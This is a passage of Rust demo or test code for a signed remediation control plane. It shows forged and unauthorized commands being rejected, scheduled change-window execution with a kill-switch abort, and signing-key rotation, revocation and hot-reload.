    let r = op_step!(
        CommandKind::Draft(Box::new(exec_action("fix-openssl-8"))),
        1
    );
    println!(
        "    (1) operator signs Draft   -> {:?} ({})",
        r.outcome, r.detail
    );
    assert_eq!(r.outcome, torda_control_plane::CommandOutcome::Applied);
    assert_eq!(b8.state("fix-openssl-8"), Some(ActionState::Drafted));
    // dry_run is a LOCAL read-only preview (not a wire command).
    let preview8 = b8
        .dry_run("fix-openssl-8", &DemoExec::default(), "alice")
        .unwrap();
    println!("        local dry-run preview: {}", preview8.preview);

    let r = op_step!(CommandKind::Submit, 2);
    println!(
        "    (2) operator signs Submit  -> {:?} (state {:?})",
        r.outcome,
        b8.state("fix-openssl-8")
    );
    assert_eq!(r.outcome, torda_control_plane::CommandOutcome::Applied);

    // Approve is signed by a DISTINCT approver (bob) with his OWN key — four-eyes on the wire.
    let mut approve8 = wire8(CommandKind::Approve, "bob", 3);
    bob8.sign(&mut approve8);
    client8.send_command(&mut c8, approve8).unwrap();
    assert!(loop8.serve_one(&mut a8, &mut b8, &SystemClock).unwrap());
    let r = client8
        .await_result(&mut c8)
        .unwrap()
        .expect("approver result");
    println!(
        "    (3) approver signs Approve -> {:?} (state {:?})  <- four-eyes",
        r.outcome,
        b8.state("fix-openssl-8")
    );
    assert_eq!(r.outcome, torda_control_plane::CommandOutcome::Applied);
    assert_eq!(b8.state("fix-openssl-8"), Some(ActionState::Approved));

    // EXECUTION: signed Canary -> promotes; signed Rollout -> closes. Both gated exactly like authoring.
    let r = op_step!(CommandKind::Canary, 4);
    println!(
        "    (4) operator signs Canary  -> {:?} ({})  <- EXECUTION gated like authoring",
        r.outcome, r.detail
    );
    assert_eq!(r.outcome, torda_control_plane::CommandOutcome::Applied);
    assert!(
        r.detail.contains("Promoted"),
        "canary detail carries the StageOutcome: {}",
        r.detail
    );
    assert_eq!(b8.state("fix-openssl-8"), Some(ActionState::Rollout));

    let r = op_step!(CommandKind::Rollout, 5);
    println!(
        "    (5) operator signs Rollout -> {:?} ({})  <- EXECUTION gated like authoring",
        r.outcome, r.detail
    );
    assert_eq!(r.outcome, torda_control_plane::CommandOutcome::Applied);
    assert!(
        r.detail.contains("Closed"),
        "rollout detail carries the StageOutcome: {}",
        r.detail
    );

    // Final proof: action Closed AND the stub executor REALLY applied targets through the gated wire.
    assert_eq!(
        b8.state("fix-openssl-8"),
        Some(ActionState::Closed),
        "the verified fix closed over the wire"
    );
    assert!(
        !applied_log.is_empty(),
        "targets were applied through the gated wire execution path"
    );
    println!(
        "        applied targets (via the gated wire path): {:?}",
        applied_log.list()
    );
    println!("    action Closed — canary+rollout executed via SIGNED commands over the channel  \u{2713}");

    // -- (2) A FORGED canary is rejected — execution gated at the signature -----------------------
    let forged_log = SharedLog::default();
    let mut bf = Bridge::new(VecAuditSink::default());
    to_approved(&mut bf, exec_action("fix-openssl-8f"));
    let state_before_forged = bf.state("fix-openssl-8f");
    let handlerf = torda_control_plane::AgentControlHandler::new(&verifier, &policy, &agent);
    let mut loopf = torda_control_plane::AgentControlLoop::with_session(
        handlerf,
        &session8,
        0,
        Box::new(LoggingExec {
            applied: forged_log.clone(),
        }),
        Box::new(FixedVerifier),
    );
    let mut serverf = torda_control_plane::Ed25519Verifier::new();
    serverf.trust("agent-1", agent.verifying_key());
    let mut clientf = torda_control_server::ControlPlaneClient::new(
        torda_control_plane::CommandSigner::from_seed("alice", [3u8; 32]),
        serverf,
    );
    let (mut cf, mut af) = DuplexTransport::pair();
    // A Canary with a BAD signature (valid session/seq, but not authentic).
    let forged_canary = ControlCommand {
        action_id: "fix-openssl-8f".into(),
        kind: CommandKind::Canary,
        actor: "alice".into(),
        session: session8.clone(),
        seq: 1,
        schedule: None,
        signature: "forged".into(),
    };
    clientf.send_command(&mut cf, forged_canary).unwrap();
    assert!(loopf.serve_one(&mut af, &mut bf, &SystemClock).unwrap());
    let rf = clientf
        .await_result(&mut cf)
        .unwrap()
        .expect("authentic rejection returned");
    println!(
        "    forged canary over the wire -> {:?}, executor did NOT run  <- execution gated",
        rf.outcome
    );
    assert_eq!(
        rf.outcome,
        torda_control_plane::CommandOutcome::Rejected,
        "forged canary rejected over the wire"
    );
    // NOTHING EXECUTED: the shared applied-log is empty and the bridge did not advance.
    assert!(
        forged_log.is_empty(),
        "the executor was NEVER called — nothing applied to any target"
    );
    assert_eq!(
        bf.state("fix-openssl-8f"),
        state_before_forged,
        "bridge state did not advance past Approved"
    );
    assert_eq!(bf.state("fix-openssl-8f"), Some(ActionState::Approved));

    // -- (3) An UNAUTHORIZED (validly-signed) canary is rejected — execution gated at authz ------
    let authz_log = SharedLog::default();
    let mut bu = Bridge::new(VecAuditSink::default());
    to_approved(&mut bu, exec_action("fix-openssl-8u"));
    let handleru = torda_control_plane::AgentControlHandler::new(&verifier, &policy, &agent);
    let mut loopu = torda_control_plane::AgentControlLoop::with_session(
        handleru,
        &session8,
        0,
        Box::new(LoggingExec {
            applied: authz_log.clone(),
        }),
        Box::new(FixedVerifier),
    );
    let mut serveru = torda_control_plane::Ed25519Verifier::new();
    serveru.trust("agent-1", agent.verifying_key());
    let mut clientu = torda_control_server::ControlPlaneClient::new(
        torda_control_plane::CommandSigner::from_seed("alice", [3u8; 32]),
        serveru,
    );
    let (mut cu, mut au) = DuplexTransport::pair();
    // Bob (Approver) validly SIGNS a Canary with his own trusted key — but Approvers may NOT execute.
    let mut approver_canary = ControlCommand {
        action_id: "fix-openssl-8u".into(),
        kind: CommandKind::Canary,
        actor: "bob".into(),
        session: session8.clone(),
        seq: 1,
        schedule: None,
        signature: String::new(),
    };
    bob8.sign(&mut approver_canary);
    clientu.send_command(&mut cu, approver_canary).unwrap();
    assert!(loopu.serve_one(&mut au, &mut bu, &SystemClock).unwrap());
    let ru = clientu
        .await_result(&mut cu)
        .unwrap()
        .expect("authentic rejection returned");
    println!(
        "    approver's canary -> {:?} (not authorized to execute)  <- authz gated",
        ru.outcome
    );
    assert_eq!(
        ru.outcome,
        torda_control_plane::CommandOutcome::Rejected,
        "an Approver is not authorized to execute"
    );
    assert!(
        authz_log.is_empty(),
        "the executor was never called for the unauthorized actor"
    );
    assert_eq!(
        bu.state("fix-openssl-8u"),
        Some(ActionState::Approved),
        "bridge state unchanged"
    );

    // -- (4) Audit trail for the execution stages, attributed to the signing operator ------------
    println!("    audit trail (execution stages attributed to the signer):");
    for e in &b8.audit().events {
        if matches!(e.to, ActionState::Rollout | ActionState::Closed) {
            println!(
                "        #{:<2} {:>10?} -> {:<8?} by {:<6} | {}",
                e.seq, e.from, e.to, e.actor, e.detail
            );
        }
    }
    println!("    note: execution now rides the same signed + authorized + replay-guarded channel as authoring —");
    println!("          \"a bridge, never a decider\": every stage is a user-authored, signed, triggered command.");

    println!("\n[9] Scheduled execution — change-window alignment (P3b-9 — an approved, signed command fires only inside its window):");
    // Self-contained: fresh per-scenario bridges, DuplexTransport pairs, AgentControlLoops (each
    // holding a `LoggingExec` with its OWN shared applied-log) + FixedVerifier, and ControlPlaneClients.
    // Everything is driven by a DETERMINISTIC `FakeClock` — no wall clock — so `serve_one` ENQUEUES a
    // scheduled canary (gates run ONCE, the seq is consumed there) and `loop.tick` RELEASES it only when
    // the clock enters its signed window. A local `verifier9`/`policy9` add a Responder (carol) for the
    // kill-switch scenario; alice stays Operator (authors+executes), bob stays Approver (four-eyes).
    let bob9 = torda_control_plane::CommandSigner::from_seed("bob", [4u8; 32]);
    let carol9 = torda_control_plane::CommandSigner::from_seed("carol", [11u8; 32]); // Responder — kill switch
    let mut verifier9 = torda_control_plane::Ed25519Verifier::new();
    verifier9.trust("alice", alice.verifying_key());
    verifier9.trust("bob", bob9.verifying_key());
    verifier9.trust("carol", carol9.verifying_key());
    let mut policy9 = torda_remediation::control::RolePolicy::new();
    policy9.assign("alice", torda_remediation::control::Role::Operator);
    policy9.assign("bob", torda_remediation::control::Role::Approver);
    policy9.assign("carol", torda_remediation::control::Role::Responder);
    let session9 = torda_control_server::establish_session("host-1", 9);
    println!("    established control session: {session9}   (window [100,200]; FakeClock drives release — deterministic, no wall clock)");

    // A scheduled Canary frame on (session9, seq) carrying a SIGNED window, UNSIGNED (signed by the caller).
    let sched_canary = |action_id: &str, seq: u64, window: Schedule| ControlCommand {
        action_id: action_id.into(),
        kind: CommandKind::Canary,
        actor: "alice".into(),
        session: session9.clone(),
        seq,
        schedule: Some(window),
        signature: String::new(),
    };

    // -- (1) FIRES ONLY INSIDE THE WINDOW ---------------------------------------------------------
    let log1 = SharedLog::default();
    let mut b9 = Bridge::new(VecAuditSink::default());
    let handler9 = torda_control_plane::AgentControlHandler::new(&verifier9, &policy9, &agent);
    let mut loop9 = torda_control_plane::AgentControlLoop::with_session(
        handler9,
        &session9,
        0,
        Box::new(LoggingExec {
            applied: log1.clone(),
        }),
        Box::new(FixedVerifier),
    );
    let mut server9 = torda_control_plane::Ed25519Verifier::new();
    server9.trust("agent-1", agent.verifying_key());
    let mut client9 = torda_control_server::ControlPlaneClient::new(
        torda_control_plane::CommandSigner::from_seed("alice", [3u8; 32]),
        server9,
    );
    let (mut c9, mut a9) = DuplexTransport::pair();
    let clock = FakeClock::new(50); // deterministic; starts BEFORE the window
    approve_over_wire(
        &mut client9,
        &mut c9,
        &mut a9,
        &mut loop9,
        &mut b9,
        &session9,
        "sched-fires",
        &bob9,
        &clock,
    );

    // Operator signs a Canary SCHEDULED for [100,200]; serve_one ENQUEUES it (does not fire).
    let mut canary = sched_canary(
        "sched-fires",
        4,
        Schedule {
            not_before: 100,
            not_after: 200,
        },
    );
    client9.sign(&mut canary);
    client9.send_command(&mut c9, canary).unwrap();
    assert!(loop9.serve_one(&mut a9, &mut b9, &clock).unwrap());
    let r = client9
        .await_result(&mut c9)
        .unwrap()
        .expect("scheduled ack");
    println!(
        "    operator signs Canary scheduled for [100,200] -> {:?} ({})",
        r.outcome, r.detail
    );
    assert_eq!(r.outcome, torda_control_plane::CommandOutcome::Applied);
    assert!(
        r.detail.contains("scheduled"),
        "the ack reports scheduling, not execution: {}",
        r.detail
    );
    assert!(
        log1.is_empty(),
        "nothing applied at enqueue time — deferred, not fired"
    );
    assert_eq!(
        b9.state("sched-fires"),
        Some(ActionState::Approved),
        "still Approved — the canary is only scheduled"
    );

    // Tick BEFORE the window opens (now=50): pending, nothing fires.
    clock.set(50);
    let fired = loop9.tick(&mut b9, &clock);
    println!("    tick @50 : pending, nothing applied                 <- window not open");
    assert!(
        fired.is_empty(),
        "before not_before the command does not fire"
    );
    assert!(
        log1.is_empty(),
        "the executor NEVER ran before the window opened"
    );
    assert_eq!(b9.state("sched-fires"), Some(ActionState::Approved));

    // Advance INTO the window (now=150) and tick: it FIRES through the loop -> Promoted, targets applied.
    clock.set(150);
    let fired = loop9.tick(&mut b9, &clock);
    println!(
        "    tick @150: canary FIRED -> {:?}   <- inside the window",
        fired
    );
    assert_eq!(
        fired,
        vec![("sched-fires".to_string(), StageOutcome::Promoted)],
        "fires in-window -> Promoted"
    );
    assert_eq!(
        log1.list(),
        vec!["host-1"],
        "the canary cohort (size 1) applied through the loop's executor"
    );
    assert_eq!(
        b9.state("sched-fires"),
        Some(ActionState::Rollout),
        "the released canary promoted to Rollout"
    );

    // Close it: an IMMEDIATE (unscheduled) signed Rollout over the wire — gated exactly like [8].
    let mut rollout = ControlCommand {
        action_id: "sched-fires".into(),
        kind: CommandKind::Rollout,
        actor: "alice".into(),
        session: session9.clone(),
        seq: 5,
        schedule: None,
        signature: String::new(),
    };
    client9.sign(&mut rollout);
    client9.send_command(&mut c9, rollout).unwrap();
    assert!(loop9.serve_one(&mut a9, &mut b9, &clock).unwrap());
    let r = client9.await_result(&mut c9).unwrap().expect("rollout ack");
    println!(
        "    operator signs Rollout (immediate) -> {:?} ({})",
        r.outcome, r.detail
    );
    assert_eq!(r.outcome, torda_control_plane::CommandOutcome::Applied);
    assert!(
        r.detail.contains("Closed"),
        "rollout detail carries the StageOutcome: {}",
        r.detail
    );
    assert_eq!(
        b9.state("sched-fires"),
        Some(ActionState::Closed),
        "the scheduled canary + rollout closed the action"
    );
    println!("        action Closed — scheduled canary fired ONLY inside [100,200]  \u{2713}");

    // -- (2) ABORTED BEFORE THE WINDOW -> NEVER FIRES ---------------------------------------------
    let log2 = SharedLog::default();
    let mut ba = Bridge::new(VecAuditSink::default());
    let handlera = torda_control_plane::AgentControlHandler::new(&verifier9, &policy9, &agent);
    let mut loopa = torda_control_plane::AgentControlLoop::with_session(
        handlera,
        &session9,
        0,
        Box::new(LoggingExec {
            applied: log2.clone(),
        }),
        Box::new(FixedVerifier),
    );
    let mut servera = torda_control_plane::Ed25519Verifier::new();
    servera.trust("agent-1", agent.verifying_key());
    let mut clienta = torda_control_server::ControlPlaneClient::new(
        torda_control_plane::CommandSigner::from_seed("alice", [3u8; 32]),
        servera,
    );
    let (mut ca, mut aa) = DuplexTransport::pair();
    let clock = FakeClock::new(50);
    approve_over_wire(
        &mut clienta,
        &mut ca,
        &mut aa,
        &mut loopa,
        &mut ba,
        &session9,
        "sched-aborted",
        &bob9,
        &clock,
    );

    // Operator schedules the canary for [100,200].
    let mut canary = sched_canary(
        "sched-aborted",
        4,
        Schedule {
            not_before: 100,
            not_after: 200,
        },
    );
    clienta.sign(&mut canary);
    clienta.send_command(&mut ca, canary).unwrap();
    assert!(loopa.serve_one(&mut aa, &mut ba, &clock).unwrap());
    assert_eq!(
        clienta
            .await_result(&mut ca)
            .unwrap()
            .expect("scheduled ack")
            .outcome,
        torda_control_plane::CommandOutcome::Applied
    );

    // BEFORE the window opens, a Responder (carol) signs a GENUINE Abort over the wire — the kill switch.
    let mut abort = ControlCommand {
        action_id: "sched-aborted".into(),
        kind: CommandKind::Abort {
            reason: "change window cancelled".into(),
        },
        actor: "carol".into(),
        session: session9.clone(),
        seq: 5,
        schedule: None,
        signature: String::new(),
    };
    carol9.sign(&mut abort);
    clienta.send_command(&mut ca, abort).unwrap();
    assert!(loopa.serve_one(&mut aa, &mut ba, &clock).unwrap());
    let r = clienta.await_result(&mut ca).unwrap().expect("abort ack");
    println!(
        "    responder signs Abort (kill switch) -> {:?} (state {:?})  <- pending canary cancelled",
        r.outcome,
        ba.state("sched-aborted")
    );
    assert_eq!(
        r.outcome,
        torda_control_plane::CommandOutcome::Applied,
        "the genuine Abort applied"
    );
    assert_eq!(ba.state("sched-aborted"), Some(ActionState::Aborted));

    // Advance INTO the window and tick: the cancelled command fires nothing, ever.
    clock.set(150);
    let fired = loopa.tick(&mut ba, &clock);
    println!("    aborted action: tick fired nothing                  <- cancelled");
    assert!(
        fired.is_empty(),
        "a cancelled scheduled command never fires"
    );
    assert!(
        log2.is_empty(),
        "the executor NEVER ran for the aborted change"
    );
    assert_eq!(
        ba.state("sched-aborted"),
        Some(ActionState::Aborted),
        "still Aborted — nothing executed"
    );

    // -- (3) WINDOW EXPIRES -> NEVER FIRES --------------------------------------------------------
    let log3 = SharedLog::default();
    let mut be = Bridge::new(VecAuditSink::default());
    let handlere = torda_control_plane::AgentControlHandler::new(&verifier9, &policy9, &agent);
    let mut loope = torda_control_plane::AgentControlLoop::with_session(
        handlere,
        &session9,
        0,
        Box::new(LoggingExec {
            applied: log3.clone(),
        }),
        Box::new(FixedVerifier),
    );
    let mut servere = torda_control_plane::Ed25519Verifier::new();
    servere.trust("agent-1", agent.verifying_key());
    let mut cliente = torda_control_server::ControlPlaneClient::new(
        torda_control_plane::CommandSigner::from_seed("alice", [3u8; 32]),
        servere,
    );
    let (mut ce, mut ae) = DuplexTransport::pair();
    let clock = FakeClock::new(50);
    approve_over_wire(
        &mut cliente,
        &mut ce,
        &mut ae,
        &mut loope,
        &mut be,
        &session9,
        "sched-expired",
        &bob9,
        &clock,
    );

    // Operator schedules the canary for [100,200].
    let mut canary = sched_canary(
        "sched-expired",
        4,
        Schedule {
            not_before: 100,
            not_after: 200,
        },
    );
    cliente.sign(&mut canary);
    cliente.send_command(&mut ce, canary).unwrap();
    assert!(loope.serve_one(&mut ae, &mut be, &clock).unwrap());
    assert_eq!(
        cliente
            .await_result(&mut ce)
            .unwrap()
            .expect("scheduled ack")
            .outcome,
        torda_control_plane::CommandOutcome::Applied
    );

    // NEVER tick inside [100,200]. Jump PAST not_after and tick: the missed window expires — dropped, audited.
    clock.set(300);
    let fired = loope.tick(&mut be, &clock);
    println!("    expired action: window missed, canary never ran     <- expired");
    assert!(fired.is_empty(), "an expired command NEVER fires late");
    assert!(
        log3.is_empty(),
        "the executor NEVER ran — a missed window applies nothing"
    );
    assert_eq!(
        be.state("sched-expired"),
        Some(ActionState::Approved),
        "state unchanged by the expired command"
    );
    assert!(
        be.audit()
            .events
            .iter()
            .any(|e| e.outcome == Outcome::Rejected && e.detail.contains("expired")),
        "the expiry is audited"
    );

    println!("    note: scheduling defers WHEN an approved, signed command fires — it aligns the change with a change");
    println!("          window. The four-eyes approval flow is unchanged; nothing fires that a human did not author +");
    println!("          approve + schedule; cancel (kill switch) and window-expiry keep control.  \"A bridge, never a decider.\"");

    println!(
        "\n[10] Signing-key rotation & revocation (P3b-10 — keys load from ops-provisioned files):"
    );
    // Self-contained. Signing keys + trust sets live in ops-provisioned FILES, never in
    // source. A unique temp dir under std::env::temp_dir() stands in for a real key store
    // (e.g. /etc/ua/keys). We write a private seed file (alice.key) + a trust-dir public-key
    // file (alice.keys), load BOTH FROM DISK (from_key_file + load_trust_dir — the real ops
    // path, not just in-memory bytes), and best-effort clean up at the end.
    let keydir = std::env::temp_dir().join(format!(
        "torda-keydemo-{}-{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0),
    ));
    let trustdir = keydir.join("trust");
    std::fs::create_dir_all(&trustdir).expect("create temp key + trust dirs");

    // ed25519 key material is built deterministically from seeds here (dev/test); ops
    // generates + custodies the real keys. k1 = alice's CURRENT operator key.
    let k1_seed = [21u8; 32];
    let k1 = torda_control_plane::CommandSigner::from_seed("alice", k1_seed);
    let k1_pub = k1.verifying_key();
    // Private seed file: one hex-encoded 32-byte seed line (comments/blank lines ignored).
    let priv_path = keydir.join("alice.key");
    std::fs::write(
        &priv_path,
        format!(
            "# alice operator private seed (hex)\n{}\n",
            hex::encode(k1_seed)
        ),
    )
    .expect("write private key file");
    // Trust-dir file: STEM = actor id ("alice"); its lines are alice's trusted public keys.
    std::fs::write(
        trustdir.join("alice.keys"),
        format!(
            "# alice trusted public key(s)\n{}\n",
            hex::encode(k1_pub.to_bytes())
        ),
    )
    .expect("write trust file");

    // A signed Draft over a session, ready to hand to verify — reuses the [1] `action()`.
    let cmd_from = |signer: &torda_control_plane::CommandSigner| {
        signed(
            signer,
            "fix-openssl-10",
            CommandKind::Draft(Box::new(action())),
            "alice",
        )
    };
    let verifies = |v: &torda_control_plane::Ed25519Verifier, c: &ControlCommand| {
        v.verify(&c.payload(), &c.signature, "alice")
    };

    // (1) LOAD FROM FILES + verify. Load the SIGNER from its private-key file and the trust
    //     STORE from the directory — the ops file path, not just bytes. Sign, then verify.
    let file_signer = torda_control_plane::CommandSigner::from_key_file("alice", &priv_path)
        .expect("load operator signer from file");
    let mut kv =
        torda_control_plane::Ed25519Verifier::load_trust_dir(&trustdir).expect("load trust dir");
    let cmd_k1 = cmd_from(&file_signer); // the file-loaded key is the same key as k1
    assert!(
        verifies(&kv, &cmd_k1),
        "file-loaded signer + dir-loaded trust verify a real signed command"
    );
    println!("    (1) loaded operator key from file; command verifies  \u{2713}");

    // (2) ROTATE (overlap). Ops issues a NEW operator key k2 and distributes its public half;
    //     the verifier now TRUSTS BOTH k1 (old) and k2 (new). During this overlap an in-flight
    //     old-key-signed command is still honored while new commands sign k2 — nothing is dropped.
    let k2 = torda_control_plane::CommandSigner::from_seed("alice", [22u8; 32]);
    kv.trust("alice", k2.verifying_key()); // ADDITIVE — k1 stays trusted alongside k2
    let cmd_k2 = cmd_from(&k2);
    assert!(
        verifies(&kv, &cmd_k1),
        "old key still verifies DURING overlap"
    );
    assert!(verifies(&kv, &cmd_k2), "new key verifies DURING overlap");
    println!("    (2) rotation overlap: old key still valid, new key valid  \u{2713}");

    // (3) RETIRE the old key (rotation complete). Revoke k1: its signatures are rejected
    //     immediately, while the new key k2 keeps verifying — the rotation has landed.
    kv.revoke("alice", &k1_pub);
    assert!(
        !verifies(&kv, &cmd_k1),
        "retired old key is REJECTED after the overlap"
    );
    assert!(
        verifies(&kv, &cmd_k2),
        "new key still verifies after the old key is retired"
    );
    println!("    (3) old key retired: old signature rejected, new key valid  <- rotated");

    // (4) REVOKE a COMPROMISED key. Treat the now-active k2 as compromised; the SAME command
    //     that verified true a line ago verifies FALSE the instant its key is revoked.
    assert!(
        verifies(&kv, &cmd_k2),
        "the (soon-compromised) key verifies right before revoke"
    );
    kv.revoke("alice", &k2.verifying_key());
    assert!(
        !verifies(&kv, &cmd_k2),
        "the SAME command is rejected the instant the key is revoked"
    );
    // alice now has NO trusted keys — every signature claiming alice fails closed.
    assert!(
        !verifies(&kv, &cmd_k1) && !verifies(&kv, &cmd_k2),
        "all keys revoked -> fail-closed for the actor"
    );
    println!("    (4) compromised key revoked: signatures rejected immediately  <- revoked");

    let _ = std::fs::remove_dir_all(&keydir); // best-effort cleanup (ignore errors)
    println!("    note: signing keys load from ops-provisioned FILES (never source); rotation trusts the new");
    println!("          key BEFORE retiring the old (no in-flight command dropped); revocation is immediate;");
    println!("          verify stays fail-closed + verify_strict.");

    println!("\n[11] Hot-reload — revoke a signing key on a running agent (P3b-12 — trust reloads from ops files, no restart):");
    // Self-contained: a unique temp trust dir under std::env::temp_dir() stands in for the
    // ops-provisioned trust store (e.g. /etc/ua/trust). We wrap the loaded store in a
    // ReloadableVerifier — the SAME &dyn SignatureVerifier a running AgentControlHandler holds —
    // then revoke + reload it LIVE and prove the change lands on the very next verify. Cleaned up
    // best-effort at the end.
    let hrdir = std::env::temp_dir().join(format!(
        "torda-hotreload-{}-{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0),
    ));
    std::fs::create_dir_all(&hrdir).expect("create temp trust dir");
    // Write operator alice's PUBLIC key to `<actor>.pub` (stem = actor id; lines = trusted keys).
    let write_alice_trust = || {
        std::fs::write(
            hrdir.join("alice.pub"),
            format!(
                "# alice trusted public key(s)\n{}\n",
                hex::encode(alice.verifying_key().to_bytes())
            ),
        )
        .expect("write alice trust file");
    };
    write_alice_trust();
    // The running verifier: trust store loaded FROM the dir, wrapped so it can be hot-reloaded.
    let rv = torda_control_plane::ReloadableVerifier::new(
        torda_control_plane::Ed25519Verifier::load_trust_dir(&hrdir).expect("initial trust load"),
    );
    // A genuine alice-signed command; ed25519 is deterministic so this is the exact "same command"
    // reused across the revoke below.
    let hr_cmd = signed(
        &alice,
        "fix-openssl-11",
        CommandKind::Draft(Box::new(action())),
        "alice",
    );
    assert!(
        rv.verify(&hr_cmd.payload(), &hr_cmd.signature, "alice"),
        "alice trusted before any reload"
    );
    println!("    (1) alice's command verifies  \u{2713}");

    // (2) REVOKE: rewrite the trust dir to REMOVE alice's key, then hot-reload the SAME verifier —
    //     no reconstruction, no restart. The very same command must now be REJECTED.
    std::fs::remove_file(hrdir.join("alice.pub")).expect("remove alice's key from the trust dir");
    rv.reload_from_dir(&hrdir)
        .expect("reload of an empty-but-valid dir succeeds (revoke everyone)");
    assert!(
        !rv.verify(&hr_cmd.payload(), &hr_cmd.signature, "alice"),
        "revocation applied live: the SAME command no longer verifies after reload"
    );
    println!("    (2) signing key revoked + reloaded -> same command now REJECTED (no restart)  <- revoked live");

    // (3) FAIL-SAFE: re-add alice + reload so she verifies again, then reload from a BOGUS path.
    //     The reload returns Err AND the live trust is UNCHANGED — alice STILL verifies.
    write_alice_trust();
    rv.reload_from_dir(&hrdir).expect("re-add alice and reload");
    assert!(
        rv.verify(&hr_cmd.payload(), &hr_cmd.signature, "alice"),
        "alice re-trusted after re-adding + reload"
    );
    let bogus = hrdir.join("does-not-exist");
    assert!(
        rv.reload_from_dir(&bogus).is_err(),
        "a reload from a missing dir returns Err"
    );
    assert!(
        rv.verify(&hr_cmd.payload(), &hr_cmd.signature, "alice"),
        "fail-safe: the live trust is intact after the bad reload — alice still verifies"
    );
    println!("    (3) bad reload is a no-op -> agent keeps serving  <- fail-safe");

    let _ = std::fs::remove_dir_all(&hrdir); // best-effort cleanup (ignore errors)
    println!("    note: signing-key trust reloads from ops-provisioned FILES on a RUNNING agent; revocation/rotation");
    println!("          takes effect on the NEXT command with no restart; a bad reload is fail-safe (keeps the current");
    println!("          trust).  \"Revoke immediately, no downtime.\"");

    println!("\n== demo complete: forged rejected, authentic action verified & Closed, the bidirectional signed-result round-trip authenticated (genuine outcomes accepted, MITM tamper caught), replay resistance proven (command replay, result replay, and drop-and-substitute all caught), the control channel driven end-to-end OVER A TRANSPORT (command applied + signed result accepted on the wire, wire replay caught by the loop's guard), and SIGNED, GATED EXECUTION over the channel (canary+rollout applied via signed commands; forged and unauthorized canaries rejected with the executor never run — execution gated exactly like authoring), and SCHEDULED EXECUTION aligned to a change window (a deterministic FakeClock releases an approved, signed canary ONLY inside its window; a second is aborted before its window and never fires; a third's window expires and never fires — change-window alignment WITHOUT auto-patching), and SIGNING-KEY ROTATION & REVOCATION (signing keys + trust sets load from ops-provisioned FILES; a rotation trusts the new key before retiring the old so no in-flight command is dropped, then the retired key is rejected while the new key still verifies; a compromised key is revoked and its signatures rejected immediately — all fail-closed + verify_strict, keys never in source), and CONFIG HOT-RELOAD on a RUNNING agent (a signing key REVOKED from the ops trust dir + reload_from_dir makes the SAME command verify FALSE on the next command with NO restart, while a bad reload is a fail-safe no-op that keeps the current trust) ==");
}
